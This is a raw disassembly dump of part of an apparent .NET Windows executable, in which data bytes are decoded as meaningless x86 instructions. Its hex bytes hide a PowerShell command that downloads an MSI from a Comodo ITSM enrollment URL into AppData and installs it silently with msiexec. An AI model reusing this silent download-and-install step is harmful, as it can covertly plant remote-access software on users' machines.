  404ab9:	65 6e                	outsb  %gs:(%esi),(%dx)
  404abb:	72 6f                	jb     0x404b2c
  404abd:	6c                   	insb   (%dx),%es:(%edi)
  404abe:	6c                   	insb   (%dx),%es:(%edi)
  404abf:	2f                   	das
  404ac0:	74 6f                	je     0x404b31
  404ac2:	6b 65 6e 2f          	imul   $0x2f,0x6e(%ebp),%esp
  404ac6:	77 69                	ja     0x404b31
  404ac8:	7a 61                	jp     0x404b2b
  404aca:	72 64                	jb     0x404b30
  404acc:	2f                   	das
  404acd:	74 6f                	je     0x404b3e
  404acf:	6b 65 6e 2f          	imul   $0x2f,0x6e(%ebp),%esp
  404ad3:	36 35 66 37 38 30    	ss xor $0x30383766,%eax
  404ad9:	33 66 31             	xor    0x31(%esi),%esp
  404adc:	61                   	popa
  404add:	33 65 37             	xor    0x37(%ebp),%esp
  404ae0:	39 35 61 33 61 30    	cmp    %esi,0x30613361
  404ae6:	64 31 64 61 31       	xor    %esp,%fs:0x31(%ecx,%eiz,2)
  404aeb:	34 30                	xor    $0x30,%al
  404aed:	32 35 65 34 63 66    	xor    0x66633465,%dh
  404af3:	22 20                	and    (%eax),%ah
  404af5:	2d 4d 65 74 68       	sub    $0x6874654d,%eax
  404afa:	6f                   	outsl  %ds:(%esi),(%dx)
  404afb:	64 20 48 65          	and    %cl,%fs:0x65(%eax)
  404aff:	61                   	popa
  404b00:	64 3b 24 63          	cmp    %fs:(%ebx,%eiz,2),%esp
  404b04:	6f                   	outsl  %ds:(%esi),(%dx)
  404b05:	6e                   	outsb  %ds:(%esi),(%dx)
  404b06:	74 65                	je     0x404b6d
  404b08:	6e                   	outsb  %ds:(%esi),(%dx)
  404b09:	74 44                	je     0x404b4f
  404b0b:	69 73 70 6f 73 69 74 	imul   $0x7469736f,0x70(%ebx),%esi
  404b12:	69 6f 6e 20 3d 20 24 	imul   $0x24203d20,0x6e(%edi),%ebp
  404b19:	72 65                	jb     0x404b80
  404b1b:	73 70                	jae    0x404b8d
  404b1d:	6f                   	outsl  %ds:(%esi),(%dx)
  404b1e:	6e                   	outsb  %ds:(%esi),(%dx)
  404b1f:	73 65                	jae    0x404b86
  404b21:	2e 48                	cs dec %eax
  404b23:	65 61                	gs popa
  404b25:	64 65 72 73          	fs gs jb 0x404b9c
  404b29:	5b                   	pop    %ebx
  404b2a:	27                   	daa
  404b2b:	43                   	inc    %ebx
  404b2c:	6f                   	outsl  %ds:(%esi),(%dx)
  404b2d:	6e                   	outsb  %ds:(%esi),(%dx)
  404b2e:	74 65                	je     0x404b95
  404b30:	6e                   	outsb  %ds:(%esi),(%dx)
  404b31:	74 2d                	je     0x404b60
  404b33:	44                   	inc    %esp
  404b34:	69 73 70 6f 73 69 74 	imul   $0x7469736f,0x70(%ebx),%esi
  404b3b:	69 6f 6e 27 5d 3b 24 	imul   $0x243b5d27,0x6e(%edi),%ebp
  404b42:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  404b49:	65 20 3d 20 28 24 63 	and    %bh,%gs:0x63242820
  404b50:	6f                   	outsl  %ds:(%esi),(%dx)
  404b51:	6e                   	outsb  %ds:(%esi),(%dx)
  404b52:	74 65                	je     0x404bb9
  404b54:	6e                   	outsb  %ds:(%esi),(%dx)
  404b55:	74 44                	je     0x404b9b
  404b57:	69 73 70 6f 73 69 74 	imul   $0x7469736f,0x70(%ebx),%esi
  404b5e:	69 6f 6e 20 2d 73 70 	imul   $0x70732d20,0x6e(%edi),%ebp
  404b65:	6c                   	insb   (%dx),%es:(%edi)
  404b66:	69 74 20 27 66 69 6c 	imul   $0x656c6966,0x27(%eax,%eiz,1),%esi
  404b6d:	65 
  404b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  404b6f:	61                   	popa
  404b70:	6d                   	insl   (%dx),%es:(%edi)
  404b71:	65 3d 27 29 5b 31    	gs cmp $0x315b2927,%eax
  404b77:	5d                   	pop    %ebp
  404b78:	2e 54                	cs push %esp
  404b7a:	72 69                	jb     0x404be5
  404b7c:	6d                   	insl   (%dx),%es:(%edi)
  404b7d:	28 27                	sub    %ah,(%edi)
  404b7f:	22 27                	and    (%edi),%ah
  404b81:	29 3b                	sub    %edi,(%ebx)
  404b83:	24 6f                	and    $0x6f,%al
  404b85:	75 74                	jne    0x404bfb
  404b87:	70 75                	jo     0x404bfe
  404b89:	74 50                	je     0x404bdb
  404b8b:	61                   	popa
  404b8c:	74 68                	je     0x404bf6
  404b8e:	20 3d 20 4a 6f 69    	and    %bh,0x696f4a20
  404b94:	6e                   	outsb  %ds:(%esi),(%dx)
  404b95:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404b9a:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404ba0:	20 22                	and    %ah,(%edx)
  404ba2:	24 75                	and    $0x75,%al
  404ba4:	73 72                	jae    0x404c18
  404ba6:	5c                   	pop    %esp
  404ba7:	41                   	inc    %ecx
  404ba8:	70 70                	jo     0x404c1a
  404baa:	44                   	inc    %esp
  404bab:	61                   	popa
  404bac:	74 61                	je     0x404c0f
  404bae:	5c                   	pop    %esp
  404baf:	4c                   	dec    %esp
  404bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb1:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  404bb4:	22 20                	and    (%eax),%ah
  404bb6:	2d 43 68 69 6c       	sub    $0x6c696843,%eax
  404bbb:	64 50                	fs push %eax
  404bbd:	61                   	popa
  404bbe:	74 68                	je     0x404c28
  404bc0:	20 24 66             	and    %ah,(%esi,%eiz,2)
  404bc3:	69 6c 65 4e 61 6d 65 	imul   $0x3b656d61,0x4e(%ebp,%eiz,2),%ebp
  404bca:	3b 
  404bcb:	49                   	dec    %ecx
  404bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  404bcd:	76 6f                	jbe    0x404c3e
  404bcf:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404bd3:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404bd7:	71 75                	jno    0x404c4e
  404bd9:	65 73 74             	gs jae 0x404c50
  404bdc:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404be2:	22 68 74             	and    0x74(%eax),%ch
  404be5:	74 70                	je     0x404c57
  404be7:	73 3a                	jae    0x404c23
  404be9:	2f                   	das
  404bea:	2f                   	das
  404beb:	6e                   	outsb  %ds:(%esi),(%dx)
  404bec:	65 72 66             	gs jb  0x404c55
  404bef:	65 72 2e             	gs jb  0x404c20
  404bf2:	69 74 73 6d 2d 75 73 	imul   $0x3173752d,0x6d(%ebx,%esi,2),%esi
  404bf9:	31 
  404bfa:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  404bfe:	6f                   	outsl  %ds:(%esi),(%dx)
  404bff:	64 6f                	outsl  %fs:(%esi),(%dx)
  404c01:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  404c05:	2f                   	das
  404c06:	65 6e                	outsb  %gs:(%esi),(%dx)
  404c08:	72 6f                	jb     0x404c79
  404c0a:	6c                   	insb   (%dx),%es:(%edi)
  404c0b:	6c                   	insb   (%dx),%es:(%edi)
  404c0c:	2f                   	das
  404c0d:	74 6f                	je     0x404c7e
  404c0f:	6b 65 6e 2f          	imul   $0x2f,0x6e(%ebp),%esp
  404c13:	77 69                	ja     0x404c7e
  404c15:	7a 61                	jp     0x404c78
  404c17:	72 64                	jb     0x404c7d
  404c19:	2f                   	das
  404c1a:	74 6f                	je     0x404c8b
  404c1c:	6b 65 6e 2f          	imul   $0x2f,0x6e(%ebp),%esp
  404c20:	36 35 66 37 38 30    	ss xor $0x30383766,%eax
  404c26:	33 66 31             	xor    0x31(%esi),%esp
  404c29:	61                   	popa
  404c2a:	33 65 37             	xor    0x37(%ebp),%esp
  404c2d:	39 35 61 33 61 30    	cmp    %esi,0x30613361
  404c33:	64 31 64 61 31       	xor    %esp,%fs:0x31(%ecx,%eiz,2)
  404c38:	34 30                	xor    $0x30,%al
  404c3a:	32 35 65 34 63 66    	xor    0x66633465,%dh
  404c40:	22 20                	and    (%eax),%ah
  404c42:	2d 4f 75 74 46       	sub    $0x4674754f,%eax
  404c47:	69 6c 65 20 24 6f 75 	imul   $0x74756f24,0x20(%ebp,%eiz,2),%ebp
  404c4e:	74 
  404c4f:	70 75                	jo     0x404cc6
  404c51:	74 50                	je     0x404ca3
  404c53:	61                   	popa
  404c54:	74 68                	je     0x404cbe
  404c56:	3b 20                	cmp    (%eax),%esp
  404c58:	47                   	inc    %edi
  404c59:	65 74 2d             	gs je  0x404c89
  404c5c:	43                   	inc    %ebx
  404c5d:	68 69 6c 64 49       	push   $0x49646c69
  404c62:	74 65                	je     0x404cc9
  404c64:	6d                   	insl   (%dx),%es:(%edi)
  404c65:	20 22                	and    %ah,(%edx)
  404c67:	24 75                	and    $0x75,%al
  404c69:	73 72                	jae    0x404cdd
  404c6b:	5c                   	pop    %esp
  404c6c:	41                   	inc    %ecx
  404c6d:	70 70                	jo     0x404cdf
  404c6f:	44                   	inc    %esp
  404c70:	61                   	popa
  404c71:	74 61                	je     0x404cd4
  404c73:	5c                   	pop    %esp
  404c74:	4c                   	dec    %esp
  404c75:	6f                   	outsl  %ds:(%esi),(%dx)
  404c76:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  404c79:	5c                   	pop    %esp
  404c7a:	2a 2e                	sub    (%esi),%ch
  404c7c:	6d                   	insl   (%dx),%es:(%edi)
  404c7d:	73 69                	jae    0x404ce8
  404c7f:	22 20                	and    (%eax),%ah
  404c81:	7c 20                	jl     0x404ca3
  404c83:	46                   	inc    %esi
  404c84:	6f                   	outsl  %ds:(%esi),(%dx)
  404c85:	72 45                	jb     0x404ccc
  404c87:	61                   	popa
  404c88:	63 68 2d             	arpl   %ebp,0x2d(%eax)
  404c8b:	4f                   	dec    %edi
  404c8c:	62 6a 65             	bound  %ebp,0x65(%edx)
  404c8f:	63 74 20 7b          	arpl   %esi,0x7b(%eax,%eiz,1)
  404c93:	20 6d 73             	and    %ch,0x73(%ebp)
  404c96:	69 65 78 65 63 20 2f 	imul   $0x2f206365,0x78(%ebp),%esp
  404c9d:	69 20 24 5f 2e 46    	imul   $0x462e5f24,(%eax),%esp
  404ca3:	75 6c                	jne    0x404d11
  404ca5:	6c                   	insb   (%dx),%es:(%edi)
  404ca6:	4e                   	dec    %esi
  404ca7:	61                   	popa
  404ca8:	6d                   	insl   (%dx),%es:(%edi)
  404ca9:	65 20 2f             	and    %ch,%gs:(%edi)
  404cac:	71 6e                	jno    0x404d1c
  404cae:	20 2f                	and    %ch,(%edi)
  404cb0:	6e                   	outsb  %ds:(%esi),(%dx)
  404cb1:	6f                   	outsl  %ds:(%esi),(%dx)
  404cb2:	72 65                	jb     0x404d19
  404cb4:	73 74                	jae    0x404d2a
  404cb6:	61                   	popa
  404cb7:	72 74                	jb     0x404d2d
  404cb9:	20 7d 00             	and    %bh,0x0(%ebp)
  404cbc:	42                   	inc    %edx
  404cbd:	53                   	push   %ebx
  404cbe:	4a                   	dec    %edx
  404cbf:	42                   	inc    %edx
  404cc0:	01 00                	add    %eax,(%eax)
  404cc2:	01 00                	add    %eax,(%eax)
  404cc4:	00 00                	add    %al,(%eax)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	0c 00                	or     $0x0,%al
  404cca:	00 00                	add    %al,(%eax)
  404ccc:	76 34                	jbe    0x404d02
  404cce:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404cd1:	33 30                	xor    (%eax),%esi
  404cd3:	33 31                	xor    (%ecx),%esi
  404cd5:	39 00                	cmp    %eax,(%eax)
  404cd7:	00 00                	add    %al,(%eax)
  404cd9:	00 05 00 6c 00 00    	add    %al,0x6c00
  404cdf:	00 3c 1c             	add    %bh,(%esp,%ebx,1)
  404ce2:	00 00                	add    %al,(%eax)
  404ce4:	23 7e 00             	and    0x0(%esi),%edi
  404ce7:	00 a8 1c 00 00 a8    	add    %ch,-0x57ffffe4(%eax)
  404ced:	22 00                	and    (%eax),%al
  404cef:	00 23                	add    %ah,(%ebx)
  404cf1:	53                   	push   %ebx
  404cf2:	74 72                	je     0x404d66
  404cf4:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  404cfb:	00 50 3f             	add    %dl,0x3f(%eax)
  404cfe:	00 00                	add    %al,(%eax)
  404d00:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404d03:	00 23                	add    %ah,(%ebx)
  404d05:	55                   	push   %ebp
  404d06:	53                   	push   %ebx
  404d07:	00 dc                	add    %bl,%ah
  404d09:	43                   	inc    %ebx
  404d0a:	00 00                	add    %al,(%eax)
  404d0c:	10 00                	adc    %al,(%eax)
  404d0e:	00 00                	add    %al,(%eax)
  404d10:	23 47 55             	and    0x55(%edi),%eax
  404d13:	49                   	dec    %ecx
  404d14:	44                   	inc    %esp
  404d15:	00 00                	add    %al,(%eax)
  404d17:	00 ec                	add    %ch,%ah
  404d19:	43                   	inc    %ebx
  404d1a:	00 00                	add    %al,(%eax)
  404d1c:	60                   	pusha
  404d1d:	08 00                	or     %al,(%eax)
  404d1f:	00 23                	add    %ah,(%ebx)
  404d21:	42                   	inc    %edx
  404d22:	6c                   	insb   (%dx),%es:(%edi)
  404d23:	6f                   	outsl  %ds:(%esi),(%dx)
  404d24:	62 00                	bound  %eax,(%eax)
  404d26:	00 00                	add    %al,(%eax)
  404d28:	00 00                	add    %al,(%eax)
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	02 00                	add    (%eax),%al
  404d2e:	00 01                	add    %al,(%ecx)
  404d30:	57                   	push   %edi
  404d31:	3f                   	aas
  404d32:	a2 1d 09 0b 00       	mov    %al,0xb091d
  404d37:	00 00                	add    %al,(%eax)
  404d39:	fa                   	cli
  404d3a:	25 33 00 16 00       	and    $0x160033,%eax
  404d3f:	00 01                	add    %al,(%ecx)
  404d41:	00 00                	add    %al,(%eax)
  404d43:	00 95 00 00 00 16    	add    %dl,0x16000000(%ebp)
  404d49:	00 00                	add    %al,(%eax)
  404d4b:	00 59 00             	add    %bl,0x0(%ecx)
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	7d 00                	jge    0x404d52
  404d52:	00 00                	add    %al,(%eax)
  404d54:	80 00 00             	addb   $0x0,(%eax)
  404d57:	00 01                	add    %al,(%ecx)
  404d59:	00 00                	add    %al,(%eax)
  404d5b:	00 1f                	add    %bl,(%edi)
  404d5d:	01 00                	add    %eax,(%eax)
  404d5f:	00 21                	add    %ah,(%ecx)
  404d61:	00 00                	add    %al,(%eax)
  404d63:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404d66:	00 00                	add    %al,(%eax)
  404d68:	02 00                	add    (%eax),%al
  404d6a:	00 00                	add    %al,(%eax)
  404d6c:	13 00                	adc    (%eax),%eax
  404d6e:	00 00                	add    %al,(%eax)
  404d70:	06                   	push   %es
  404d71:	00 00                	add    %al,(%eax)
  404d73:	00 21                	add    %ah,(%ecx)
  404d75:	00 00                	add    %al,(%eax)
  404d77:	00 37                	add    %dh,(%edi)
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	00 03                	add    %al,(%ebx)
  404d7d:	00 00                	add    %al,(%eax)
  404d7f:	00 0b                	add    %cl,(%ebx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	00 05 00 00 00 01    	add    %al,0x1000000
  404d89:	00 00                	add    %al,(%eax)
  404d8b:	00 05 00 00 00 01    	add    %al,0x1000000
  404d91:	00 00                	add    %al,(%eax)
  404d93:	00 0a                	add    %cl,(%edx)
  404d95:	00 00                	add    %al,(%eax)
  404d97:	00 02                	add    %al,(%edx)
  404d99:	00 00                	add    %al,(%eax)
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	00 0a                	add    %cl,(%edx)
  404d9f:	00 01                	add    %al,(%ecx)
  404da1:	00 00                	add    %al,(%eax)
  404da3:	00 00                	add    %al,(%eax)
  404da5:	00 06                	add    %al,(%esi)
  404da7:	00 3b                	add    %bh,(%ebx)
  404da9:	01 34 01             	add    %esi,(%ecx,%eax,1)
  404dac:	06                   	push   %es
  404dad:	00 42 01             	add    %al,0x1(%edx)
  404db0:	34 01                	xor    $0x1,%al
  404db2:	06                   	push   %es
  404db3:	00 4c 01 34          	add    %cl,0x34(%ecx,%eax,1)
  404db7:	01 0a                	add    %ecx,(%edx)
  404db9:	00 90 01 6e 01 0e    	add    %dl,0xe016e01(%eax)
  404dbf:	00 bc 01 a7 01 0a 00 	add    %bh,0xa01a7(%ecx,%eax,1)
  404dc6:	c1 01 6e             	roll   $0x6e,(%ecx)
  404dc9:	01 0a                	add    %ecx,(%edx)
  404dcb:	00 d5                	add    %dl,%ch
  404dcd:	01 6e 01             	add    %ebp,0x1(%esi)
  404dd0:	06                   	push   %es
  404dd1:	00 e8                	add    %ch,%al
  404dd3:	01 dc                	add    %ebx,%esp
  404dd5:	01 0a                	add    %ecx,(%edx)
  404dd7:	00 11                	add    %dl,(%ecx)
  404dd9:	02 51 01             	add    0x1(%ecx),%dl
  404ddc:	0a 00                	or     (%eax),%al
  404dde:	23 02                	and    (%edx),%eax
  404de0:	51                   	push   %ecx
  404de1:	01 06                	add    %eax,(%esi)
  404de3:	00 85 04 34 01 0a    	add    %al,0xa013404(%ebp)
  404de9:	00 e0                	add    %ah,%al
  404deb:	04 6e                	add    $0x6e,%al
  404ded:	01 0a                	add    %ecx,(%edx)
  404def:	00 03                	add    %al,(%ebx)
  404df1:	05 6e 01 0a 00       	add    $0xa016e,%eax
  404df6:	9b                   	fwait
  404df7:	05 6e 01 0a 00       	add    $0xa016e,%eax
  404dfc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404dfd:	05 6e 01 0a 00       	add    $0xa016e,%eax
  404e02:	ff 05 6e 01 0a 00    	incl   0xa016e
  404e08:	07                   	pop    %es
  404e09:	06                   	push   %es
  404e0a:	6e                   	outsb  %ds:(%esi),(%dx)
  404e0b:	01 0e                	add    %ecx,(%esi)
  404e0d:	00 52 07             	add    %dl,0x7(%edx)
  404e10:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e11:	01 06                	add    %eax,(%esi)
  404e13:	00 83 07 64 07 0a    	add    %al,0xa076407(%ebx)
  404e19:	00 90 07 6e 01 0e    	add    %dl,0xe016e07(%eax)
  404e1f:	00 ac 07 a7 01 0e 00 	add    %ch,0xe01a7(%edi,%eax,1)
  404e26:	d6                   	salc
  404e27:	07                   	pop    %es
  404e28:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e29:	01 12                	add    %edx,(%edx)
  404e2b:	00 2c 08             	add    %ch,(%eax,%ecx,1)
  404e2e:	1e                   	push   %ds
  404e2f:	08 06                	or     %al,(%esi)
  404e31:	00 6d 08             	add    %ch,0x8(%ebp)
  404e34:	52                   	push   %edx
  404e35:	08 16                	or     %dl,(%esi)
  404e37:	00 94 08 85 08 12 00 	add    %dl,0x120885(%eax,%ecx,1)
  404e3e:	bb 08 1e 08 0a       	mov    $0xa081e08,%ebx
  404e43:	00 e5                	add    %ah,%ch
  404e45:	08 51 01             	or     %dl,0x1(%ecx)
  404e48:	0e                   	push   %cs
  404e49:	00 fb                	add    %bh,%bl
  404e4b:	08 a7 01 0e 00 15    	or     %ah,0x15000e01(%edi)
  404e51:	09 a7 01 06 00 28    	or     %esp,0x28000601(%edi)
  404e57:	0b 52 08             	or     0x8(%edx),%edx
  404e5a:	0a 00                	or     (%eax),%al
  404e5c:	35 0b 51 01 0a       	xor    $0xa01510b,%eax
  404e61:	00 3e                	add    %bh,(%esi)
  404e63:	0b 6e 01             	or     0x1(%esi),%ebp
  404e66:	0a 00                	or     (%eax),%al
  404e68:	66 0b 51 01          	or     0x1(%ecx),%dx
  404e6c:	06                   	push   %es
  404e6d:	00 c0                	add    %al,%al
  404e6f:	0b b0 0b 06 00 76    	or     0x7600060b(%eax),%esi
  404e75:	0c 61                	or     $0x61,%al
  404e77:	0c 06                	or     $0x6,%al
  404e79:	00 ac 0c 34 01 06 00 	add    %ch,0x60134(%esp,%ecx,1)
  404e80:	20 0d 34 01 06 00    	and    %cl,0x60134
  404e86:	49                   	dec    %ecx
  404e87:	10 34 01             	adc    %dh,(%ecx,%eax,1)
  404e8a:	06                   	push   %es
  404e8b:	00 fb                	add    %bh,%bl
  404e8d:	10 dc                	adc    %bl,%ah
  404e8f:	10 06                	adc    %al,(%esi)
  404e91:	00 0e                	add    %cl,(%esi)
  404e93:	11 dc                	adc    %ebx,%esp
  404e95:	10 06                	adc    %al,(%esi)
  404e97:	00 f2                	add    %dh,%dl
  404e99:	11 dc                	adc    %ebx,%esp
  404e9b:	10 06                	adc    %al,(%esi)
  404e9d:	00 f7                	add    %dh,%bh
  404e9f:	12 e5                	adc    %ch,%ah
  404ea1:	12 06                	adc    (%esi),%al
  404ea3:	00 0e                	add    %cl,(%esi)
  404ea5:	13 e5                	adc    %ebp,%esp
  404ea7:	12 06                	adc    (%esi),%al
  404ea9:	00 27                	add    %ah,(%edi)
  404eab:	13 e5                	adc    %ebp,%esp
  404ead:	12 06                	adc    (%esi),%al
  404eaf:	00 42 13             	add    %al,0x13(%edx)
  404eb2:	e5 12                	in     $0x12,%eax
  404eb4:	06                   	push   %es
  404eb5:	00 5d 13             	add    %bl,0x13(%ebp)
  404eb8:	e5 12                	in     $0x12,%eax
  404eba:	06                   	push   %es
  404ebb:	00 76 13             	add    %dh,0x13(%esi)
  404ebe:	e5 12                	in     $0x12,%eax
  404ec0:	06                   	push   %es
  404ec1:	00 93 13 e5 12 06    	add    %dl,0x612e513(%ebx)
  404ec7:	00 b0 13 e5 12 06    	add    %dh,0x612e513(%eax)
  404ecd:	00 e9                	add    %ch,%cl
  404ecf:	13 c9                	adc    %ecx,%ecx
  404ed1:	13 06                	adc    (%esi),%eax
  404ed3:	00 09                	add    %cl,(%ecx)
  404ed5:	14 c9                	adc    $0xc9,%al
  404ed7:	13 06                	adc    (%esi),%eax
  404ed9:	00 31                	add    %dh,(%ecx)
  404edb:	14 dc                	adc    $0xdc,%al
  404edd:	10 06                	adc    %al,(%esi)
  404edf:	00 4b 14             	add    %cl,0x14(%ebx)
  404ee2:	34 01                	xor    $0x1,%al
  404ee4:	06                   	push   %es
  404ee5:	00 60 14             	add    %ah,0x14(%eax)
  404ee8:	dc 10                	fcoml  (%eax)
  404eea:	06                   	push   %es
  404eeb:	00 6f 14             	add    %ch,0x14(%edi)
  404eee:	34 01                	xor    $0x1,%al
  404ef0:	06                   	push   %es
  404ef1:	00 84 14 dc 10 06 00 	add    %al,0x610dc(%esp,%edx,1)
  404ef8:	9a 14 dc 10 06 00 a5 	lcall  $0xa500,$0x610dc14
  404eff:	14 34                	adc    $0x34,%al
  404f01:	01 0e                	add    %ecx,(%esi)
  404f03:	00 de                	add    %bl,%dh
  404f05:	14 a7                	adc    $0xa7,%al
  404f07:	01 0a                	add    %ecx,(%edx)
  404f09:	00 20                	add    %ah,(%eax)
  404f0b:	15 6e 01 06 00       	adc    $0x6016e,%eax
  404f10:	50                   	push   %eax
  404f11:	15 34 01 16 00       	adc    $0x160134,%eax
  404f16:	88 15 85 08 0e 00    	mov    %dl,0xe0885
  404f1c:	8e 15 a7 01 0e 00    	mov    0xe01a7,%ss
  404f22:	b7 15                	mov    $0x15,%bh
  404f24:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404f25:	01 0e                	add    %ecx,(%esi)
  404f27:	00 d7                	add    %dl,%bh
  404f29:	15 a7 01 0e 00       	adc    $0xe01a7,%eax
  404f2e:	df 15 a7 01 16 00    	fists  0x1601a7
  404f34:	ef                   	out    %eax,(%dx)
  404f35:	15 85 08 0e 00       	adc    $0xe0885,%eax
  404f3a:	02 16                	add    (%esi),%dl
  404f3c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404f3d:	01 16                	add    %edx,(%esi)
  404f3f:	00 a6 05 85 08 16    	add    %ah,0x16088505(%esi)
  404f45:	00 e0                	add    %ah,%al
  404f47:	04 85                	add    $0x85,%al
  404f49:	08 ef                	or     %ch,%bh
  404f4b:	00 47 16             	add    %al,0x16(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	06                   	push   %es
  404f51:	00 ae 16 34 01 0e    	add    %ch,0xe013416(%esi)
  404f57:	00 cf                	add    %cl,%bh
  404f59:	16                   	push   %ss
  404f5a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404f5b:	01 0e                	add    %ecx,(%esi)
  404f5d:	00 f3                	add    %dh,%bl
  404f5f:	16                   	push   %ss
  404f60:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404f61:	01 06                	add    %eax,(%esi)
  404f63:	00 17                	add    %dl,(%edi)
  404f65:	17                   	pop    %ss
  404f66:	e5 12                	in     $0x12,%eax
  404f68:	16                   	push   %ss
  404f69:	00 42 17             	add    %al,0x17(%edx)
  404f6c:	85 08                	test   %ecx,(%eax)
  404f6e:	0e                   	push   %cs
  404f6f:	00 86 17 a7 01 0e    	add    %al,0xe01a717(%esi)
  404f75:	00 d5                	add    %dl,%ch
  404f77:	17                   	pop    %ss
  404f78:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404f79:	01 0e                	add    %ecx,(%esi)
  404f7b:	00 e1                	add    %ah,%cl
  404f7d:	17                   	pop    %ss
  404f7e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404f7f:	01 06                	add    %eax,(%esi)
  404f81:	00 e9                	add    %ch,%cl
  404f83:	17                   	pop    %ss
  404f84:	52                   	push   %edx
  404f85:	08 06                	or     %al,(%esi)
  404f87:	00 60 18             	add    %ah,0x18(%eax)
  404f8a:	4d                   	dec    %ebp
  404f8b:	18 06                	sbb    %al,(%esi)
  404f8d:	00 75 18             	add    %dh,0x18(%ebp)
  404f90:	34 01                	xor    $0x1,%al
  404f92:	06                   	push   %es
  404f93:	00 a4 18 34 01 0e 00 	add    %ah,0xe0134(%eax,%ebx,1)
  404f9a:	a9 18 a7 01 0a       	test   $0xa01a718,%eax
  404f9f:	00 3d 19 6e 01 16    	add    %bh,0x16016e19
  404fa5:	00 a0 19 85 08 0e    	add    %ah,0xe088519(%eax)
  404fab:	00 f0                	add    %dh,%al
  404fad:	19 a7 01 12 00 3b    	sbb    %esp,0x3b001201(%edi)
  404fb3:	1a 1e                	sbb    (%esi),%bl
  404fb5:	08 16                	or     %dl,(%esi)
  404fb7:	00 a8 1a 85 08 16    	add    %ch,0x1608851a(%eax)
  404fbd:	00 b6 1a 85 08 0e    	add    %dh,0xe08851a(%esi)
  404fc3:	00 c9                	add    %cl,%cl
  404fc5:	1a a7 01 0a 00 0a    	sbb    0xa000a01(%edi),%ah
  404fcb:	1b 51 01             	sbb    0x1(%ecx),%edx
  404fce:	12 00                	adc    (%eax),%al
  404fd0:	49                   	dec    %ecx
  404fd1:	1b 33                	sbb    (%ebx),%esi
  404fd3:	1b 06                	sbb    (%esi),%eax
  404fd5:	00 c9                	add    %cl,%cl
  404fd7:	1b 34 01             	sbb    (%ecx,%eax,1),%esi
  404fda:	06                   	push   %es
  404fdb:	00 e1                	add    %ah,%cl
  404fdd:	1b 34 01             	sbb    (%ecx,%eax,1),%esi
  404fe0:	0e                   	push   %cs
  404fe1:	00 22                	add    %ah,(%edx)
  404fe3:	1c a7                	sbb    $0xa7,%al
  404fe5:	01 0e                	add    %ecx,(%esi)
  404fe7:	00 44 1c a7          	add    %al,-0x59(%esp,%ebx,1)
  404feb:	01 06                	add    %eax,(%esi)
  404fed:	00 6d 1c             	add    %ch,0x1c(%ebp)
  404ff0:	34 01                	xor    $0x1,%al
  404ff2:	06                   	push   %es
  404ff3:	00 72 1c             	add    %dh,0x1c(%edx)
  404ff6:	34 01                	xor    $0x1,%al
  404ff8:	06                   	push   %es
  404ff9:	00 b9 1c 34 01 06    	add    %bh,0x601341c(%ecx)
  404fff:	00 d9                	add    %bl,%cl
  405001:	1c e5                	sbb    $0xe5,%al
  405003:	12 06                	adc    (%esi),%al
  405005:	00 e9                	add    %ch,%cl
  405007:	1c e5                	sbb    $0xe5,%al
  405009:	12 06                	adc    (%esi),%al
  40500b:	00 f6                	add    %dh,%dh
  40500d:	1c e5                	sbb    $0xe5,%al
  40500f:	12 06                	adc    (%esi),%al
  405011:	00 fd                	add    %bh,%ch
  405013:	1c e5                	sbb    $0xe5,%al
  405015:	12 06                	adc    (%esi),%al
  405017:	00 25 1d 34 01 06    	add    %ah,0x601341d
  40501d:	00 45 1d             	add    %al,0x1d(%ebp)
  405020:	34 01                	xor    $0x1,%al
  405022:	06                   	push   %es
  405023:	00 76 1d             	add    %dh,0x1d(%esi)
  405026:	34 01                	xor    $0x1,%al
  405028:	06                   	push   %es
  405029:	00 97 1d 34 01 06    	add    %dl,0x601341d(%edi)
  40502f:	00 9f 1d 34 01 06    	add    %bl,0x601341d(%edi)
  405035:	00 ae 1d 34 01 06    	add    %ch,0x601341d(%esi)
  40503b:	00 e9                	add    %ch,%cl
  40503d:	1d d8 1d 06 00       	sbb    $0x61dd8,%eax
  405042:	15 1e 34 01 06       	adc    $0x601341e,%eax
  405047:	00 2b                	add    %ch,(%ebx)
  405049:	1e                   	push   %ds
  40504a:	34 01                	xor    $0x1,%al
  40504c:	06                   	push   %es
  40504d:	00 51 1e             	add    %dl,0x1e(%ecx)
  405050:	d8 1d 0a 00 66 1e    	fcomps 0x1e66000a
  405056:	51                   	push   %ecx
  405057:	01 06                	add    %eax,(%esi)
  405059:	00 8f 1e 34 01 0a    	add    %cl,0xa01341e(%edi)
  40505f:	00 aa 1e 51 01 0a    	add    %ch,0xa01511e(%edx)
  405065:	00 bd 1e 51 01 06    	add    %bh,0x601511e(%ebp)
